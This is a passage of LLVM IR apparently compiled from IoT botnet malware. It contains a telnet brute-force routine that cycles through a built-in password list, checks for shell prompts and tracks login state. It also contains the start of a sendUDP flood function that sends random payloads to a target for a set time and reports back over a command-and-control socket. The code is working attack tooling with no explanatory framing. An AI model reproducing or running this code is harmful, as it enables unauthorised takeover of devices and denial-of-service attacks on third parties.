  %253 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #14
  %254 = icmp eq i8* %253, null
  br i1 %254, label %259, label %255

; <label>:255:                                    ; preds = %252
  %256 = load i32, i32* %206, align 16
  %257 = call i32 @sclose(i32 %256)
  store i8 0, i8* %36, align 8
  %258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %258, align 1
  br label %580

; <label>:259:                                    ; preds = %252
  %260 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #14
  %261 = icmp eq i8* %260, null
  br i1 %261, label %266, label %262

; <label>:262:                                    ; preds = %259
  %263 = load i32, i32* %206, align 16
  %264 = call i32 @sclose(i32 %263)
  store i8 0, i8* %36, align 8
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %265, align 1
  br label %580

; <label>:266:                                    ; preds = %259
  %267 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #14
  %268 = icmp eq i8* %267, null
  br i1 %268, label %273, label %269

; <label>:269:                                    ; preds = %266
  %270 = load i32, i32* %206, align 16
  %271 = call i32 @sclose(i32 %270)
  store i8 0, i8* %36, align 8
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %272, align 1
  br label %580

; <label>:273:                                    ; preds = %266
  %274 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #14
  %275 = icmp eq i8* %274, null
  br i1 %275, label %280, label %276

; <label>:276:                                    ; preds = %273
  %277 = load i32, i32* %206, align 16
  %278 = call i32 @sclose(i32 %277)
  store i8 0, i8* %36, align 8
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %279, align 1
  br label %580

; <label>:280:                                    ; preds = %273
  %281 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #14
  %282 = icmp eq i8* %281, null
  br i1 %282, label %287, label %283

; <label>:283:                                    ; preds = %280
  %284 = load i32, i32* %206, align 16
  %285 = call i32 @sclose(i32 %284)
  store i8 0, i8* %36, align 8
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %286, align 1
  br label %580

; <label>:287:                                    ; preds = %280
  %288 = call i64 @strlen(i8* %231) #14
  %289 = trunc i64 %288 to i16
  store i16 %289, i16* %210, align 16
  %290 = load i32, i32* %200, align 4
  %291 = add i32 %290, 10
  %292 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %293 = icmp ult i32 %291, %292
  br i1 %293, label %294, label %580

; <label>:294:                                    ; preds = %287
  %295 = load i32, i32* %206, align 16
  %296 = call i32 @sclose(i32 %295)
  store i8 0, i8* %36, align 8
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %297, align 1
  br label %580

; <label>:298:                                    ; preds = %.lr.ph
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %300 = load i32, i32* %299, align 16
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 5
  %302 = load i8, i8* %301, align 1
  %303 = zext i8 %302 to i64
  %304 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %303
  %305 = load i8*, i8** %304, align 8
  %306 = call i64 @strlen(i8* %305) #14
  %307 = call i64 @send(i32 %300, i8* %305, i64 %306, i32 16384) #3
  %308 = icmp slt i64 %307, 0
  %309 = load i32, i32* %299, align 16
  br i1 %308, label %310, label %313

; <label>:310:                                    ; preds = %298
  %311 = call i32 @sclose(i32 %309)
  store i8 0, i8* %36, align 8
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %312, align 1
  br label %580

; <label>:313:                                    ; preds = %298
  %314 = call i64 @send(i32 %309, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i64 2, i32 16384) #3
  %315 = icmp slt i64 %314, 0
  br i1 %315, label %316, label %320

; <label>:316:                                    ; preds = %313
  %317 = load i32, i32* %299, align 16
  %318 = call i32 @sclose(i32 %317)
  store i8 0, i8* %36, align 8
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %319, align 1
  br label %580

; <label>:320:                                    ; preds = %313
  store i8 6, i8* %36, align 8
  br label %580

; <label>:321:                                    ; preds = %.lr.ph
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %323 = load i32, i32* %322, align 4
  %324 = icmp eq i32 %323, 0
  br i1 %324, label %325, label %327

; <label>:325:                                    ; preds = %321
  %326 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %326, i32* %322, align 4
  br label %327

; <label>:327:                                    ; preds = %325, %321
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %329 = load i32, i32* %328, align 16
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %331 = load i8*, i8** %330, align 8
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 7
  %333 = load i16, i16* %332, align 16
  %334 = zext i16 %333 to i32
  %335 = call i32 @readUntil(i32 %329, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %331, i32 1024, i32 %334)
  %336 = icmp eq i32 %335, 0
  br i1 %336, label %354, label %337

; <label>:337:                                    ; preds = %327
  store i32 0, i32* %322, align 4
  store i16 0, i16* %332, align 16
  %338 = load i8*, i8** %330, align 8
  %339 = call i8* @strstr(i8* %338, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i64 0, i64 0)) #14
  %340 = icmp eq i8* %339, null
  br i1 %340, label %345, label %341

; <label>:341:                                    ; preds = %337
  call void @llvm.memset.p0i8.i64(i8* %338, i8 0, i64 1024, i32 1, i1 false)
  %342 = load i32, i32* %328, align 16
  %343 = call i32 @sclose(i32 %342)
  store i8 0, i8* %36, align 8
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %344, align 1
  br label %580

; <label>:345:                                    ; preds = %337
  %346 = call i32 @matchPrompt(i8* %338)
  %347 = icmp eq i32 %346, 0
  br i1 %347, label %348, label %352

; <label>:348:                                    ; preds = %345
  call void @llvm.memset.p0i8.i64(i8* %338, i8 0, i64 1024, i32 1, i1 false)
  %349 = load i32, i32* %328, align 16
  %350 = call i32 @sclose(i32 %349)
  store i8 0, i8* %36, align 8
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %351, align 1
  br label %580

; <label>:352:                                    ; preds = %345
  store i8 7, i8* %36, align 8
  %353 = load i8*, i8** %330, align 8
  call void @llvm.memset.p0i8.i64(i8* %353, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:354:                                    ; preds = %327
  %355 = load i32, i32* %328, align 16
  %356 = load i8*, i8** %330, align 8
  %357 = load i16, i16* %332, align 16
  %358 = zext i16 %357 to i32
  %359 = call i32 @readUntil(i32 %355, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %356, i32 1024, i32 %358)
  %360 = icmp eq i32 %359, 0
  br i1 %360, label %378, label %361

; <label>:361:                                    ; preds = %354
  store i32 0, i32* %322, align 4
  store i16 0, i16* %332, align 16
  %362 = load i8*, i8** %330, align 8
  %363 = call i8* @strstr(i8* %362, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0)) #14
  %364 = icmp eq i8* %363, null
  br i1 %364, label %369, label %365

; <label>:365:                                    ; preds = %361
  call void @llvm.memset.p0i8.i64(i8* %362, i8 0, i64 1024, i32 1, i1 false)
  %366 = load i32, i32* %328, align 16
  %367 = call i32 @sclose(i32 %366)
  store i8 0, i8* %36, align 8
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %368, align 1
  br label %580

; <label>:369:                                    ; preds = %361
  %370 = call i32 @matchPrompt(i8* %362)
  %371 = icmp eq i32 %370, 0
  br i1 %371, label %372, label %376

; <label>:372:                                    ; preds = %369
  call void @llvm.memset.p0i8.i64(i8* %362, i8 0, i64 1024, i32 1, i1 false)
  %373 = load i32, i32* %328, align 16
  %374 = call i32 @sclose(i32 %373)
  store i8 0, i8* %36, align 8
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %375, align 1
  br label %580

; <label>:376:                                    ; preds = %369
  store i8 7, i8* %36, align 8
  %377 = load i8*, i8** %330, align 8
  call void @llvm.memset.p0i8.i64(i8* %377, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:378:                                    ; preds = %354
  %379 = load i32, i32* %328, align 16
  %380 = load i8*, i8** %330, align 8
  %381 = load i16, i16* %332, align 16
  %382 = zext i16 %381 to i32
  %383 = call i32 @readUntil(i32 %379, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %380, i32 1024, i32 %382)
  %384 = icmp eq i32 %383, 0
  br i1 %384, label %402, label %385

; <label>:385:                                    ; preds = %378
  store i32 0, i32* %322, align 4
  store i16 0, i16* %332, align 16
  %386 = load i8*, i8** %330, align 8
  %387 = call i8* @strstr(i8* %386, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0)) #14
  %388 = icmp eq i8* %387, null
  br i1 %388, label %393, label %389

; <label>:389:                                    ; preds = %385
  call void @llvm.memset.p0i8.i64(i8* %386, i8 0, i64 1024, i32 1, i1 false)
  %390 = load i32, i32* %328, align 16
  %391 = call i32 @sclose(i32 %390)
  store i8 0, i8* %36, align 8
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %392, align 1
  br label %580

; <label>:393:                                    ; preds = %385
  %394 = call i32 @matchPrompt(i8* %386)
  %395 = icmp eq i32 %394, 0
  br i1 %395, label %396, label %400

; <label>:396:                                    ; preds = %393
  call void @llvm.memset.p0i8.i64(i8* %386, i8 0, i64 1024, i32 1, i1 false)
  %397 = load i32, i32* %328, align 16
  %398 = call i32 @sclose(i32 %397)
  store i8 0, i8* %36, align 8
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %399, align 1
  br label %580

; <label>:400:                                    ; preds = %393
  store i8 7, i8* %36, align 8
  %401 = load i8*, i8** %330, align 8
  call void @llvm.memset.p0i8.i64(i8* %401, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:402:                                    ; preds = %378
  %403 = load i32, i32* %328, align 16
  %404 = load i8*, i8** %330, align 8
  %405 = load i16, i16* %332, align 16
  %406 = zext i16 %405 to i32
  %407 = call i32 @readUntil(i32 %403, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %404, i32 1024, i32 %406)
  %408 = icmp eq i32 %407, 0
  br i1 %408, label %426, label %409

; <label>:409:                                    ; preds = %402
  store i32 0, i32* %322, align 4
  store i16 0, i16* %332, align 16
  %410 = load i8*, i8** %330, align 8
  %411 = call i8* @strstr(i8* %410, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0)) #14
  %412 = icmp eq i8* %411, null
  br i1 %412, label %417, label %413

; <label>:413:                                    ; preds = %409
  call void @llvm.memset.p0i8.i64(i8* %410, i8 0, i64 1024, i32 1, i1 false)
  %414 = load i32, i32* %328, align 16
  %415 = call i32 @sclose(i32 %414)
  store i8 0, i8* %36, align 8
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %416, align 1
  br label %580

; <label>:417:                                    ; preds = %409
  %418 = call i32 @matchPrompt(i8* %410)
  %419 = icmp eq i32 %418, 0
  br i1 %419, label %420, label %424

; <label>:420:                                    ; preds = %417
  call void @llvm.memset.p0i8.i64(i8* %410, i8 0, i64 1024, i32 1, i1 false)
  %421 = load i32, i32* %328, align 16
  %422 = call i32 @sclose(i32 %421)
  store i8 0, i8* %36, align 8
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %423, align 1
  br label %580

; <label>:424:                                    ; preds = %417
  store i8 7, i8* %36, align 8
  %425 = load i8*, i8** %330, align 8
  call void @llvm.memset.p0i8.i64(i8* %425, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:426:                                    ; preds = %402
  %427 = load i32, i32* %328, align 16
  %428 = load i8*, i8** %330, align 8
  %429 = load i16, i16* %332, align 16
  %430 = zext i16 %429 to i32
  %431 = call i32 @readUntil(i32 %427, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %428, i32 1024, i32 %430)
  %432 = icmp eq i32 %431, 0
  br i1 %432, label %450, label %433

; <label>:433:                                    ; preds = %426
  store i32 0, i32* %322, align 4
  store i16 0, i16* %332, align 16
  %434 = load i8*, i8** %330, align 8
  %435 = call i8* @strstr(i8* %434, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i64 0, i64 0)) #14
  %436 = icmp eq i8* %435, null
  br i1 %436, label %441, label %437

; <label>:437:                                    ; preds = %433
  call void @llvm.memset.p0i8.i64(i8* %434, i8 0, i64 1024, i32 1, i1 false)
  %438 = load i32, i32* %328, align 16
  %439 = call i32 @sclose(i32 %438)
  store i8 0, i8* %36, align 8
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %440, align 1
  br label %580

; <label>:441:                                    ; preds = %433
  %442 = call i32 @matchPrompt(i8* %434)
  %443 = icmp eq i32 %442, 0
  br i1 %443, label %444, label %448

; <label>:444:                                    ; preds = %441
  call void @llvm.memset.p0i8.i64(i8* %434, i8 0, i64 1024, i32 1, i1 false)
  %445 = load i32, i32* %328, align 16
  %446 = call i32 @sclose(i32 %445)
  store i8 0, i8* %36, align 8
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %447, align 1
  br label %580

; <label>:448:                                    ; preds = %441
  store i8 7, i8* %36, align 8
  %449 = load i8*, i8** %330, align 8
  call void @llvm.memset.p0i8.i64(i8* %449, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:450:                                    ; preds = %426
  %451 = load i32, i32* %328, align 16
  %452 = load i8*, i8** %330, align 8
  %453 = load i16, i16* %332, align 16
  %454 = zext i16 %453 to i32
  %455 = call i32 @readUntil(i32 %451, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %452, i32 1024, i32 %454)
  %456 = icmp eq i32 %455, 0
  br i1 %456, label %474, label %457

; <label>:457:                                    ; preds = %450
  store i32 0, i32* %322, align 4
  store i16 0, i16* %332, align 16
  %458 = load i8*, i8** %330, align 8
  %459 = call i8* @strstr(i8* %458, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i64 0, i64 0)) #14
  %460 = icmp eq i8* %459, null
  br i1 %460, label %465, label %461

; <label>:461:                                    ; preds = %457
  call void @llvm.memset.p0i8.i64(i8* %458, i8 0, i64 1024, i32 1, i1 false)
  %462 = load i32, i32* %328, align 16
  %463 = call i32 @sclose(i32 %462)
  store i8 0, i8* %36, align 8
  %464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %464, align 1
  br label %580

; <label>:465:                                    ; preds = %457
  %466 = call i32 @matchPrompt(i8* %458)
  %467 = icmp eq i32 %466, 0
  br i1 %467, label %468, label %472

; <label>:468:                                    ; preds = %465
  call void @llvm.memset.p0i8.i64(i8* %458, i8 0, i64 1024, i32 1, i1 false)
  %469 = load i32, i32* %328, align 16
  %470 = call i32 @sclose(i32 %469)
  store i8 0, i8* %36, align 8
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %471, align 1
  br label %580

; <label>:472:                                    ; preds = %465
  store i8 7, i8* %36, align 8
  %473 = load i8*, i8** %330, align 8
  call void @llvm.memset.p0i8.i64(i8* %473, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:474:                                    ; preds = %450
  %475 = load i32, i32* %328, align 16
  %476 = load i8*, i8** %330, align 8
  %477 = load i16, i16* %332, align 16
  %478 = zext i16 %477 to i32
  %479 = call i32 @readUntil(i32 %475, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %476, i32 1024, i32 %478)
  %480 = icmp eq i32 %479, 0
  br i1 %480, label %498, label %481

; <label>:481:                                    ; preds = %474
  store i32 0, i32* %322, align 4
  store i16 0, i16* %332, align 16
  %482 = load i8*, i8** %330, align 8
  %483 = call i8* @strstr(i8* %482, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0)) #14
  %484 = icmp eq i8* %483, null
  br i1 %484, label %489, label %485

; <label>:485:                                    ; preds = %481
  call void @llvm.memset.p0i8.i64(i8* %482, i8 0, i64 1024, i32 1, i1 false)
  %486 = load i32, i32* %328, align 16
  %487 = call i32 @sclose(i32 %486)
  store i8 0, i8* %36, align 8
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %488, align 1
  br label %580

; <label>:489:                                    ; preds = %481
  %490 = call i32 @matchPrompt(i8* %482)
  %491 = icmp eq i32 %490, 0
  br i1 %491, label %492, label %496

; <label>:492:                                    ; preds = %489
  call void @llvm.memset.p0i8.i64(i8* %482, i8 0, i64 1024, i32 1, i1 false)
  %493 = load i32, i32* %328, align 16
  %494 = call i32 @sclose(i32 %493)
  store i8 0, i8* %36, align 8
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %495, align 1
  br label %580

; <label>:496:                                    ; preds = %489
  store i8 7, i8* %36, align 8
  %497 = load i8*, i8** %330, align 8
  call void @llvm.memset.p0i8.i64(i8* %497, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:498:                                    ; preds = %474
  %499 = load i32, i32* %328, align 16
  %500 = load i8*, i8** %330, align 8
  %501 = load i16, i16* %332, align 16
  %502 = zext i16 %501 to i32
  %503 = call i32 @readUntil(i32 %499, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %500, i32 1024, i32 %502)
  %504 = icmp eq i32 %503, 0
  br i1 %504, label %522, label %505

; <label>:505:                                    ; preds = %498
  store i32 0, i32* %322, align 4
  store i16 0, i16* %332, align 16
  %506 = load i8*, i8** %330, align 8
  %507 = call i8* @strstr(i8* %506, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #14
  %508 = icmp eq i8* %507, null
  br i1 %508, label %513, label %509

; <label>:509:                                    ; preds = %505
  call void @llvm.memset.p0i8.i64(i8* %506, i8 0, i64 1024, i32 1, i1 false)
  %510 = load i32, i32* %328, align 16
  %511 = call i32 @sclose(i32 %510)
  store i8 0, i8* %36, align 8
  %512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 0, i8* %512, align 1
  br label %580

; <label>:513:                                    ; preds = %505
  %514 = call i32 @matchPrompt(i8* %506)
  %515 = icmp eq i32 %514, 0
  br i1 %515, label %516, label %520

; <label>:516:                                    ; preds = %513
  call void @llvm.memset.p0i8.i64(i8* %506, i8 0, i64 1024, i32 1, i1 false)
  %517 = load i32, i32* %328, align 16
  %518 = call i32 @sclose(i32 %517)
  store i8 0, i8* %36, align 8
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %519, align 1
  br label %580

; <label>:520:                                    ; preds = %513
  store i8 7, i8* %36, align 8
  %521 = load i8*, i8** %330, align 8
  call void @llvm.memset.p0i8.i64(i8* %521, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:522:                                    ; preds = %498
  %523 = load i8*, i8** %330, align 8
  %524 = call i64 @strlen(i8* %523) #14
  %525 = trunc i64 %524 to i16
  store i16 %525, i16* %332, align 16
  %526 = load i32, i32* %322, align 4
  %527 = add i32 %526, 10
  %528 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %529 = icmp ult i32 %527, %528
  br i1 %529, label %530, label %580

; <label>:530:                                    ; preds = %522
  %531 = load i32, i32* %328, align 16
  %532 = call i32 @sclose(i32 %531)
  store i8 0, i8* %36, align 8
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %533, align 1
  br label %580

; <label>:534:                                    ; preds = %.lr.ph
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %536 = load i32, i32* %535, align 16
  %537 = call i64 @send(i32 %536, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0), i64 4, i32 16384) #3
  %538 = icmp slt i64 %537, 0
  br i1 %538, label %539, label %543

; <label>:539:                                    ; preds = %534
  %540 = load i32, i32* %535, align 16
  %541 = call i32 @sclose(i32 %540)
  store i8 0, i8* %36, align 8
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %542, align 1
  br label %580

; <label>:543:                                    ; preds = %534
  store i8 8, i8* %36, align 8
  br label %580

; <label>:544:                                    ; preds = %.lr.ph
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %546 = load i32, i32* %545, align 16
  %547 = call i64 @send(i32 %546, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.43, i64 0, i64 0), i64 9, i32 16384) #3
  %548 = icmp slt i64 %547, 0
  br i1 %548, label %549, label %553

; <label>:549:                                    ; preds = %544
  %550 = load i32, i32* %545, align 16
  %551 = call i32 @sclose(i32 %550)
  store i8 0, i8* %36, align 8
  %552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %552, align 1
  br label %580

; <label>:553:                                    ; preds = %544
  store i8 9, i8* %36, align 8
  br label %580

; <label>:554:                                    ; preds = %.lr.ph
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 6
  %556 = load i32, i32* %555, align 4
  %557 = icmp eq i32 %556, 0
  br i1 %557, label %558, label %560

; <label>:558:                                    ; preds = %554
  %559 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %559, i32* %555, align 4
  br label %560

; <label>:560:                                    ; preds = %558, %554
  %561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 0, i32 0
  %562 = load i32, i32* %561, align 16
  %563 = call i64 @send(i32 %562, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.44, i64 0, i64 0), i64 194, i32 16384) #3
  %564 = icmp slt i64 %563, 0
  br i1 %564, label %565, label %571

; <label>:565:                                    ; preds = %560
  %566 = load i32, i32* %561, align 16
  %567 = call i32 @sclose(i32 %566)
  store i8 0, i8* %36, align 8
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %568, align 1
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 8
  %570 = load i8*, i8** %569, align 8
  call void @llvm.memset.p0i8.i64(i8* %570, i8 0, i64 1024, i32 1, i1 false)
  br label %580

; <label>:571:                                    ; preds = %560
  %572 = load i32, i32* %555, align 4
  %573 = add i32 %572, 10
  %574 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %575 = icmp ult i32 %573, %574
  br i1 %575, label %576, label %580

; <label>:576:                                    ; preds = %571
  %577 = load i32, i32* %561, align 16
  %578 = call i32 @sclose(i32 %577)
  store i8 0, i8* %36, align 8
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %34, i32 3
  store i8 1, i8* %579, align 1
  br label %580

; <label>:580:                                    ; preds = %.lr.ph, %198, %320, %543, %553, %84, %81, %131, %126, %172, %164, %294, %287, %530, %522, %576, %571, %64, %565, %549, %539, %520, %516, %509, %496, %492, %485, %472, %468, %461, %448, %444, %437, %424, %420, %413, %400, %396, %389, %376, %372, %365, %352, %348, %341, %316, %310, %283, %276, %269, %262, %255, %248, %241, %234, %226, %215, %194, %188, %162, %151, %115, %63
  %581 = add nsw i32 %.1290, 1
  %582 = icmp slt i32 %581, %10
  %brmerge = or i1 %582, %23
  %.mux = select i1 %582, i32 %581, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %580
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #17
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %.loopexit

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = icmp eq i32 %3, 32
  br i1 %25, label %26, label %53

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %32

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* @mainCommSock, align 4
  %31 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %30, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i64 0, i64 0))
  br label %.loopexit

; <label>:32:                                     ; preds = %26
  %33 = add nsw i32 %4, 1
  %34 = sext i32 %33 to i64
  %35 = tail call noalias i8* @malloc(i64 %34) #3
  %36 = icmp eq i8* %35, null
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %32
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %35, i8 0, i64 %34, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %35, i32 %4)
  %38 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %39 = add nsw i32 %38, %2
  %40 = sext i32 %4 to i64
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %37
  %.058 = phi i32 [ 0, %37 ], [ %.058.be, %.backedge.backedge ]
  %42 = call i64 @sendto(i32 %27, i8* nonnull %35, i64 %40, i32 0, %struct.sockaddr* nonnull %41, i32 16) #3
  %43 = icmp eq i32 %.058, %5
  br i1 %43, label %44, label %51

; <label>:44:                                     ; preds = %.backedge
  br i1 %10, label %45, label %48

; <label>:45:                                     ; preds = %44
  %46 = call i32 @rand_cmwc()
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %18, align 2
  br label %48

; <label>:48:                                     ; preds = %45, %44
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %50 = icmp sgt i32 %49, %39
  br i1 %50, label %.loopexit.loopexit, label %.backedge.backedge

; <label>:51:                                     ; preds = %.backedge
  %52 = add i32 %.058, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %51, %48
  %.058.be = phi i32 [ %52, %51 ], [ 0, %48 ]
  br label %.backedge

; <label>:53:                                     ; preds = %22
  %54 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
